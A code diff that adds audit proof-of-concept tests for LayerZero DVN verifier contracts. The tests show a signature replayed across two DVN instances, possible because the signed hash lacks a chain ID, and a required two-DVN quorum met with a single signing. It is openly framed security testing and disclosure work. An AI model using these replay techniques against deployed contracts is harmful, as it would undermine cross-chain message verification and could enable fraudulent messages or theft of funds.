@@ -12,6 +12,8 @@ import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
 import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
 import { PacketV1Codec } from "@layerzerolabs/lz-evm-protocol-v2/contracts/messagelib/libs/PacketV1Codec.sol";
 
+import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";
+
 import { Setup } from "../util/Setup.sol";
 import { PacketUtil } from "../util/Packet.sol";
 import { Constant } from "../util/Constant.sol";
@@ -257,5 +259,170 @@ contract SignatureReplayTest is AuditBase {
             err2 != ECDSA.RecoverError.NoError || recovered2 != signer,
             "Malleable signature should be rejected or recover different address"
         );
+    }
+
+    // ==================== AV2.5: Cross-Chain Signature Replay ====================
+    /// @dev hashCallData = keccak256(vid, target, expiration, callData)
+    /// @dev No chain_id, no address(this) — signatures valid on ANY chain with same vid
+    /// @dev Impact: Governance actions (setSigner, setQuorum) can be replayed cross-chain
+    function test_AV2_5_CrossChainSignatureReplay() public {
+        (DVN chainA_dvn, DVN chainB_dvn) = _deployTwoDVNsAV25();
+
+        bytes memory header;
+        bytes32 payloadHash;
+        bytes32 hash;
+        bytes32 hash2;
+        ExecuteParam[] memory execParams;
+
+        {
+            Packet memory packet = _makePacket(1, address(this), address(this), "cross-chain");
+            (, header, , payloadHash) = _encodeAndSplit(packet);
+        }
+
+        {
+            bytes memory verifyCallData = abi.encodeWithSelector(
+                IReceiveUlnE2.verify.selector,
+                header,
+                payloadHash,
+                uint64(10)
+            );
+            uint256 expiration = block.timestamp + 1000;
+
+            hash = chainA_dvn.hashCallData(DST_EID, address(dstReceiveUln), verifyCallData, expiration);
+            bytes32 messageDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, messageDigest);
+            bytes memory signature = abi.encodePacked(r, s, v);
+
+            execParams = new ExecuteParam[](1);
+            execParams[0] = ExecuteParam(DST_EID, address(dstReceiveUln), verifyCallData, expiration, signature);
+            chainA_dvn.execute(execParams);
+
+            hash2 = chainB_dvn.hashCallData(DST_EID, address(dstReceiveUln), verifyCallData, expiration);
+        }
+
+        bytes32 headerHash = keccak256(header);
+
+        {
+            (bool submitted1, uint64 conf1) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(chainA_dvn));
+            assertTrue(submitted1, "ChainA DVN verification recorded");
+            assertEq(conf1, 10, "ChainA DVN confirmations correct");
+        }
+
+        // Now replay EXACT SAME signatures on chainB_dvn
+        // The hash is identical because: same vid, same target, same callData, same expiration
+        assertEq(hash, hash2, "Hash is IDENTICAL across DVN instances - no chain_id protection");
+
+        // Execute the replay
+        chainB_dvn.execute(execParams);
+
+        {
+            (bool submitted2, uint64 conf2) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(chainB_dvn));
+            assertTrue(submitted2, "ChainB DVN verification recorded via REPLAY");
+            assertEq(conf2, 10, "ChainB DVN confirmations from replay");
+        }
+
+        emit log("CONFIRMED: Cross-chain/cross-DVN signature replay succeeds");
+        emit log("Same signatures work on both DVN instances due to missing chain_id in hash");
+        emit log("Impact: If OApp lists both DVNs in config, single signing satisfies both");
+    }
+
+    function _deployTwoDVNsAV25() internal returns (DVN dvn1, DVN dvn2) {
+        address[] memory libs = new address[](4);
+        libs[0] = address(0);
+        libs[1] = address(0);
+        libs[2] = address(dstSendUln);
+        libs[3] = address(dstReceiveUln);
+        address[] memory signers_ = new address[](1);
+        signers_[0] = signer;
+        address[] memory admins = new address[](1);
+        admins[0] = address(this);
+        dvn1 = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers_, 1, admins);
+        dvn2 = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers_, 1, admins);
+        DVNFeeLib feeLib = new DVNFeeLib(DST_EID, 1e18);
+        dvn1.setWorkerFeeLib(address(feeLib));
+        dvn2.setWorkerFeeLib(address(feeLib));
+    }
+
+    // ==================== AV2.6: Shared VID Double-Verification Attack ====================
+    /// @dev If OApp config lists DVN-A and DVN-B (both with same vid) as required DVNs,
+    ///      a single set of signatures can make BOTH DVNs verify the same message.
+    ///      This halves the effective security without the OApp being aware.
+    function test_AV2_6_SharedVidDoubleVerification() public {
+        (DVN dvnA, DVN dvnB) = _deployTwoDVNsAV25();
+
+        bytes memory header;
+        bytes32 payloadHash;
+
+        // Configure OApp to require BOTH dvnA and dvnB (expecting 2 independent verifications)
+        {
+            address[] memory reqDvns = new address[](2);
+            // DVN addresses must be sorted for UlnBase config
+            if (uint160(address(dvnA)) < uint160(address(dvnB))) {
+                reqDvns[0] = address(dvnA);
+                reqDvns[1] = address(dvnB);
+            } else {
+                reqDvns[0] = address(dvnB);
+                reqDvns[1] = address(dvnA);
+            }
+
+            UlnConfig memory config = UlnConfig({
+                confirmations: 10,
+                requiredDVNCount: 2,
+                optionalDVNCount: 0,
+                optionalDVNThreshold: 0,
+                requiredDVNs: reqDvns,
+                optionalDVNs: new address[](0)
+            });
+
+            SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
+            cfgParams[0] = SetConfigParam({
+                eid: SRC_EID,
+                configType: uint32(2), // CONFIG_TYPE_ULN
+                config: abi.encode(config)
+            });
+            dstEndpoint.setConfig(address(this), address(dstReceiveUln), cfgParams);
+        }
+
+        {
+            Packet memory packet = _makePacket(1, address(this), address(this), "double-verify");
+            (, header, , payloadHash) = _encodeAndSplit(packet);
+        }
+
+        // Sign a SINGLE verify instruction — works on BOTH DVNs
+        {
+            bytes memory verifyCallData = abi.encodeWithSelector(
+                IReceiveUlnE2.verify.selector,
+                header,
+                payloadHash,
+                uint64(10)
+            );
+            uint256 expiration = block.timestamp + 1000;
+
+            bytes32 hashVal = dvnA.hashCallData(DST_EID, address(dstReceiveUln), verifyCallData, expiration);
+            bytes32 messageDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hashVal));
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, messageDigest);
+            bytes memory signature = abi.encodePacked(r, s, v);
+
+            ExecuteParam[] memory execParams = new ExecuteParam[](1);
+            execParams[0] = ExecuteParam(DST_EID, address(dstReceiveUln), verifyCallData, expiration, signature);
+
+            // Execute on dvnA — records verification under dvnA's address
+            dvnA.execute(execParams);
+            // Execute SAME params on dvnB — records verification under dvnB's address
+            dvnB.execute(execParams);
+        }
+
+        // BOTH DVNs show as verified — quorum of 2 satisfied with just 1 signing operation!
+        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
+        bytes32 headerHash = keccak256(header);
+        bool verifiable = dstReceiveUln.verifiable(resolved, headerHash, payloadHash);
+        assertTrue(verifiable, "Quorum of 2 satisfied by single signing - security halved!");
+
+        // Commit succeeds — message delivered with half the intended security
+        _commitVerification(dstReceiveUln, header, payloadHash);
+
+        emit log("CONFIRMED: Shared-vid DVNs allow double-verification with single signing");
+        emit log("OApp believes it has 2-of-2 DVN security, but only 1 signing was needed");
+        emit log("Impact: Effective quorum halved without OApp awareness");
     }
 }
